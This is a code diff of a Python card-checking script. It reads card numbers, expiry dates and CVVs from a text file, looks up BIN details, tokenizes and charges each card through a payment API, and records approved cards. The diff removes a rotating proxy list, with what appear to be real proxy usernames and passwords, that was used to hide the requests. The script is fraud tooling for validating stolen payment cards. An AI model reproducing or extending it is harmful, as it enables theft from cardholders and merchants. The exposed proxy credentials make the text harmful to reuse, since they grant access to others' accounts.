@@ -3,20 +3,12 @@ import re
 import requests
 import json
 import aiohttp
-import random
 
 # Constants
 AMOUNT = 4
 CARD_PATTERN = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")
 CC_FILE = 'cc.txt'
 APPROVE_FILE = 'approve.txt'
-
-# Proxy list
-proxy_list = [
-    "us9.cactussstp.com:3129:akoitwja:x9b2wc76QW",
-    "65.181.166.79:62128:cuvulyls:ujs1642NqY",
-    "prox-lu.pointtoserver.com:10799:purevpn0s3978104:hk6vchvcmyah",
-]
 
 async def get_bin_info(bin_number):
     url = f"https://bins.antipublic.cc/bins/{bin_number}"
@@ -50,14 +42,6 @@ def process_card(card_info, sk, pk):
     if not all([cc, mes, ano, cvv]):
         return f"❌ Invalid card details for `{card_info}`"
 
-    # Select a random proxy
-    selected_proxy = random.choice(proxy_list)
-    proxy_ip, proxy_port, proxy_user, proxy_pass = selected_proxy.split(':')
-    proxies = {
-        "http": f"http://{proxy_user}:{proxy_pass}@{proxy_ip}:{proxy_port}",
-        "https": f"https://{proxy_user}:{proxy_pass}@{proxy_ip}:{proxy_port}",
-    }
-
     token_data = {
         'type': 'card',
         "card[number]": cc,
@@ -74,7 +58,6 @@ def process_card(card_info, sk, pk):
                 "Authorization": f"Bearer {pk}",
                 "Content-Type": "application/x-www-form-urlencoded",
             },
-            proxies=proxies  # Use the random proxy here
         )
     except requests.RequestException as e:
         return f"❌ Error with card `{cc}`: {str(e)}"
@@ -111,7 +94,6 @@ def process_card(card_info, sk, pk):
                 "Authorization": f"Bearer {sk}",
                 "Content-Type": "application/x-www-form-urlencoded",
             },
-            proxies=proxies  # Use the random proxy here as well
         )
     except requests.RequestException as e:
         return f"❌ Charge error for `{cc}`: {str(e)}"
